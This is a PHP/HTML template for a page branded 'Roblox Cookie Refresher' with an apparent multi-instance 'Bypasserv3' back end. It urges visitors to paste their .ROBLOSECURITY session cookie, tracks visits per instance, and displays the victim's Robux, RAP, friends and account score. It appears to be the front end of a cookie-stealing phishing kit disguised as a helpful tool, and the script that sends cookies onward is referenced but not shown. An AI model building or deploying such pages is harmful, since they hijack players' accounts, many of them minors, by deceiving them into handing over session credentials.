<?php
/**
 * Bypasserv3 - Public Instance Page - UPDATED
 */

require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/../functions.php';

$directory = $_GET['dir'] ?? '';

if (empty($directory)) {
    die('No instance specified');
}

$directory = sanitizeDirectory($directory);
$instanceData = getInstanceData($directory);

if (!$instanceData) {
    die('Instance not found');
}

// Track visit
updateInstanceStats($directory, 'totalVisits', ($instanceData['stats']['totalVisits'] ?? 0) + 1);
updateDailyStats($directory, 'visits', 1);
updateGlobalStats('totalVisits', 1);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Refresher</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <link rel="stylesheet" href="/public/style.css">
</head>
<body class="bg-[#0f172a] text-white font-sans min-h-screen overflow-x-hidden">
    <canvas id="particles"></canvas>
    
    <div class="container max-w-lg mx-auto px-4 py-12 flex flex-col items-center min-h-screen relative z-10">
        <!-- Header -->
        <div class="text-center mb-10 space-y-4">
            <div class="relative inline-block">
                <div class="absolute inset-0 bg-blue-500/20 blur-2xl rounded-full"></div>
                <div class="relative w-16 h-16 bg-white/5 border border-white/10 rounded-2xl flex items-center justify-center backdrop-blur-sm shadow-2xl glass-effect">
                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="text-white"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                </div>
            </div>
            <h1 class="text-4xl md:text-5xl font-display font-bold tracking-tight text-glow animated-gradient-text">
                Roblox Cookie Refresher
            </h1>
            <p class="text-white/60 text-lg">
                Refresh your expired Roblox cookie instantly
            </p>
            
            <div class="inline-flex items-center gap-2 px-4 py-2 bg-white/5 border border-white/10 rounded-full glass-effect">
                <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span class="text-white/80 text-sm font-medium" id="live-status">Loading...</span>
            </div>
        </div>

        <!-- Form State -->
        <div id="form-state" class="w-full max-w-md space-y-6">
            <div class="glass-effect rounded-2xl p-8 space-y-6">
                <div>
                    <label class="block text-sm font-medium text-white/80 mb-3">Your .ROBLOSECURITY Cookie</label>
                    <textarea 
                        id="cookie-input" 
                        placeholder="Paste your .ROBLOSECURITY cookie here..."
                        class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white placeholder-white/40 focus:outline-none focus:border-blue-500 resize-none"
                        rows="4"
                    ></textarea>
                    <p class="text-xs text-white/40 mt-2">✓ Works for all countries | ✓ No bot required</p>
                </div>

                <div class="flex gap-3">
                    <button 
                        id="btn-check"
                        class="flex-1 px-4 py-3 bg-white/10 hover:bg-white/20 border border-white/20 rounded-lg text-white font-medium transition"
                    >
                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline mr-2"><polyline points="20 6 9 17 4 12"></polyline></svg>
                        Check Cookie
                    </button>
                    <button 
                        id="btn-start"
                        class="flex-1 px-4 py-3 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 rounded-lg text-white font-semibold transition transform hover:scale-105"
                    >
                        ⚡ Bypass
                    </button>
                </div>
            </div>
        </div>

        <!-- Processing State -->
        <div id="processing-state" class="hidden w-full max-w-md space-y-6">
            <div class="glass-effect rounded-2xl p-8 space-y-6 text-center">
                <div class="spinner mx-auto"></div>
                <div>
                    <h2 class="text-xl font-bold mb-2">Processing...</h2>
                    <p class="text-white/60">Connecting to Roblox servers</p>
                </div>
                <div class="space-y-2">
                    <div class="w-full bg-white/10 rounded-full h-2 overflow-hidden">
                        <div id="progress-bar" class="bg-gradient-to-r from-blue-500 to-blue-600 h-full transition-all duration-100" style="width: 0%"></div>
                    </div>
                    <p id="progress-text" class="text-sm text-white/60">0% Complete</p>
                </div>
            </div>
        </div>

        <!-- Success State -->
        <div id="success-state" class="hidden w-full max-w-md space-y-6">
            <div class="glass-effect rounded-2xl p-8 space-y-6">
                <div class="text-center space-y-4">
                    <div class="w-24 h-24 mx-auto rounded-2xl overflow-hidden border-2 border-green-500/50 shadow-lg">
                        <img id="user-avatar" src="https://via.placeholder.com/150" alt="Avatar" class="w-full h-full object-cover">
                    </div>
                    <div>
                        <h2 id="user-display-name" class="text-2xl font-bold">@Unknown</h2>
                        <p class="text-white/60">Account Verified</p>
                    </div>
                </div>

                <div class="space-y-3">
                    <div class="flex justify-between">
                        <span class="text-white/60">Username:</span>
                        <span id="info-username" class="font-medium">-</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-white/60">User ID:</span>
                        <span id="info-userid" class="font-medium">-</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-white/60">Robux:</span>
                        <span id="info-robux" class="font-medium text-green-400">0</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-white/60">RAP:</span>
                        <span id="info-rap" class="font-medium">0</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-white/60">Premium:</span>
                        <span id="info-premium" class="font-medium">No</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-white/60">Voice Chat:</span>
                        <span id="info-vc" class="font-medium">No</span>
                    </div>
                </div>

                <div class="border-t border-white/10 pt-4 space-y-3">
                    <div class="flex justify-between">
                        <span class="text-white/60">Friends:</span>
                        <span id="info-friends" class="font-medium">0</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-white/60">Followers:</span>
                        <span id="info-followers" class="font-medium">0</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-white/60">Account Age:</span>
                        <span id="info-age" class="font-medium">-</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-white/60">Groups Owned:</span>
                        <span id="info-groups" class="font-medium">0</span>
                    </div>
                </div>

                <div class="border-t border-white/10 pt-4 space-y-3">
                    <h3 class="font-semibold">Account Score</h3>
                    <div class="space-y-2">
                        <div class="w-full bg-white/10 rounded-full h-3 overflow-hidden">
                            <div id="score-bar" class="bg-gradient-to-r from-green-500 to-blue-500 h-full transition-all duration-500" style="width: 0%"></div>
                        </div>
                        <div class="flex justify-between items-center">
                            <span id="account-score" class="font-bold text-lg">0/100</span>
                            <span id="score-rating" class="text-sm text-white/60">Starter Account</span>
                        </div>
                    </div>
                </div>

                <button 
                    id="btn-restart"
                    class="w-full px-4 py-3 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 rounded-lg text-white font-semibold transition"
                >
                    ↻ Try Another Cookie
                </button>
            </div>
        </div>

        <!-- Failed State -->
        <div id="failed-state" class="hidden w-full max-w-md space-y-6">
            <div class="glass-effect rounded-2xl p-8 space-y-6 text-center">
                <div class="text-4xl">❌</div>
                <div>
                    <h2 class="text-xl font-bold mb-2">Bypass Failed</h2>
                    <p class="text-white/60">Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account</p>
                </div>
                <button 
                    id="btn-retry"
                    class="w-full px-4 py-3 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 rounded-lg text-white font-semibold transition"
                >
                    🔄 Try Again
                </button>
            </div>
        </div>
    </div>

    <script src="/public/script.js"></script>
</body>
</html>
?>
